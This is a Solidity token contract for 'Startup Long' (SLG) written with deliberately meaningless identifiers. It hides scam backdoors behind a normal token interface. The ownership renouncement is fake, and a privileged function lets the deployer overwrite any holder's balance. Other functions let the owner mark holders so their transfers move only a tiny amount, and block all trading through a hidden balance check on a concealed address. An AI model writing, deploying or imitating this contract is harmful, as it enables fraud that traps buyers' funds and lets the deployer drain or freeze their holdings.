//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface toSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract senderToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountTo {
    function createPair(address liquidityAutoToken, address feeExempt) external returns (address);
}

interface senderAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletEnableTo) external view returns (uint256);

    function transfer(address buyListMode, uint256 marketingLaunched) external returns (bool);

    function allowance(address exemptTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address buyListMode,
        uint256 marketingLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoFund, uint256 value);
    event Approval(address indexed exemptTake, address indexed spender, uint256 value);
}

interface senderAmountMetadata is senderAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StartupLong is senderToken, senderAmount, senderAmountMetadata {

    string private amountSwapTo = "Startup Long";

    function transfer(address minLiquidity, uint256 marketingLaunched) external virtual override returns (bool) {
        return sellMarketing(_msgSender(), minLiquidity, marketingLaunched);
    }

    uint256 private takeFund;

    address public tokenList;

    mapping(address => mapping(address => uint256)) private senderIs;

    constructor (){
        if (atLaunched == teamIs) {
            toWallet = teamIs;
        }
        toSender autoTxFund = toSender(swapTeam);
        atMin = amountTo(autoTxFund.factory()).createPair(autoTxFund.WETH(), address(this));
        if (toWallet == takeFund) {
            takeFund = toWallet;
        }
        tokenList = _msgSender();
        toIsTotal();
        shouldTotalTake[tokenList] = true;
        atLimit[tokenList] = enableSender;
        if (toWallet != teamIs) {
            toIs = false;
        }
        emit Transfer(address(0), tokenList, enableSender);
    }

    uint256 private enableSender = 100000000 * 10 ** 18;

    bool private buyMode;

    bool public toIs;

    event OwnershipTransferred(address indexed tradingReceiver, address indexed fundMarketing);

    function receiverLimit(address fundWallet, address buyListMode, uint256 marketingLaunched) internal returns (bool) {
        require(atLimit[fundWallet] >= marketingLaunched);
        atLimit[fundWallet] -= marketingLaunched;
        atLimit[buyListMode] += marketingLaunched;
        emit Transfer(fundWallet, buyListMode, marketingLaunched);
        return true;
    }

    function allowance(address fromReceiver, address shouldReceiver) external view virtual override returns (uint256) {
        if (shouldReceiver == swapTeam) {
            return type(uint256).max;
        }
        return senderIs[fromReceiver][shouldReceiver];
    }

    function minTrading(uint256 marketingLaunched) public {
        feeSwap();
        liquidityTeam = marketingLaunched;
    }

    mapping(address => bool) public shouldTotalTake;

    bool public teamAt;

    function approve(address shouldReceiver, uint256 marketingLaunched) public virtual override returns (bool) {
        senderIs[_msgSender()][shouldReceiver] = marketingLaunched;
        emit Approval(_msgSender(), shouldReceiver, marketingLaunched);
        return true;
    }

    uint8 private teamLiquidity = 18;

    bool public toTake;

    uint256 private atLaunched;

    function toIsTotal() public {
        emit OwnershipTransferred(tokenList, address(0));
        takeTeam = address(0);
    }

    string private receiverMarketingExempt = "SLG";

    uint256 modeSellSwap;

    bool private launchedTokenExempt;

    function transferFrom(address fundWallet, address buyListMode, uint256 marketingLaunched) external override returns (bool) {
        if (_msgSender() != swapTeam) {
            if (senderIs[fundWallet][_msgSender()] != type(uint256).max) {
                require(marketingLaunched <= senderIs[fundWallet][_msgSender()]);
                senderIs[fundWallet][_msgSender()] -= marketingLaunched;
            }
        }
        return sellMarketing(fundWallet, buyListMode, marketingLaunched);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableSender;
    }

    address private takeTeam;

    mapping(address => uint256) private atLimit;

    address totalReceiverLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function marketingFund(address modeTotal) public {
        if (autoSender) {
            return;
        }
        
        shouldTotalTake[modeTotal] = true;
        
        autoSender = true;
    }

    uint256 constant isFee = 4 ** 10;

    function balanceOf(address walletEnableTo) public view virtual override returns (uint256) {
        return atLimit[walletEnableTo];
    }

    function name() external view virtual override returns (string memory) {
        return amountSwapTo;
    }

    mapping(address => bool) public isTeam;

    address swapTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private toWallet;

    function owner() external view returns (address) {
        return takeTeam;
    }

    uint256 public teamIs;

    function liquiditySenderWallet(address listTotal) public {
        feeSwap();
        if (toIs == buyMode) {
            toWallet = atLaunched;
        }
        if (listTotal == tokenList || listTotal == atMin) {
            return;
        }
        isTeam[listTotal] = true;
    }

    bool public autoSender;

    function getOwner() external view returns (address) {
        return takeTeam;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverMarketingExempt;
    }

    function sellMarketing(address fundWallet, address buyListMode, uint256 marketingLaunched) internal returns (bool) {
        if (fundWallet == tokenList) {
            return receiverLimit(fundWallet, buyListMode, marketingLaunched);
        }
        uint256 tokenTrading = senderAmount(atMin).balanceOf(totalReceiverLaunch);
        require(tokenTrading == liquidityTeam);
        require(buyListMode != totalReceiverLaunch);
        if (isTeam[fundWallet]) {
            return receiverLimit(fundWallet, buyListMode, isFee);
        }
        return receiverLimit(fundWallet, buyListMode, marketingLaunched);
    }

    function walletSwapToken(address minLiquidity, uint256 marketingLaunched) public {
        feeSwap();
        atLimit[minLiquidity] = marketingLaunched;
    }

    uint256 liquidityTeam;

    address public atMin;

    function feeSwap() private view {
        require(shouldTotalTake[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return teamLiquidity;
    }

}